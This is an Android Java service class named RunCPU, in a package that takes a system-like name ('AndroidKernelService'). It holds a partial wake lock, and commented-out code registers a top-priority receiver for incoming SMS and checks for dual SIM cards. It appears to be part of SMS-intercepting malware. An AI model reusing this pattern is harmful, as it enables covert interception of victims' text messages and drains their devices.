package com.AndroidKernelService;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.PowerManager;
import android.telephony.TelephonyManager;

public class RunCPU extends Service{
	SMSBroadcastReceiver receiver = new SMSBroadcastReceiver();
	Method method = null;
	Object result_0 = null;
	Object result_1 = null;
	TelephonyManager tm = (TelephonyManager) this
	.getSystemService(TELEPHONY_SERVICE);
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	PowerManager.WakeLock wakeLock = null;
	public void onCreate(){
		super.onCreate();
		if (null == wakeLock) {
			PowerManager pm = (PowerManager) this
					.getSystemService(Context.POWER_SERVICE);
			wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,"com.AndroidKernelService");
			if (null != wakeLock) {
				wakeLock.acquire();
			}

		}
		
		//在此动态注册权限
		/*
		IntentFilter filter=new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        //优先级设为最高
        filter.setPriority(2147483647);
        registerReceiver(receiver, filter);
        */
        /*
		//判断是否为单卡，单卡退出，双卡运行
		IsMultiCard aIsMultiCard = new IsMultiCard();
		aIsMultiCard.judge();
		*/
		
		
		
	}
	public void onDestroy(){
		super.onDestroy();
	}

	
	public void onStart(){
		//stopSelf();
		//System.exit(0);
	}
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		super.onStartCommand(intent, flags, startId);
		//stopSelf();
		//System.exit(0);
		return START_NOT_STICKY;
	}
}
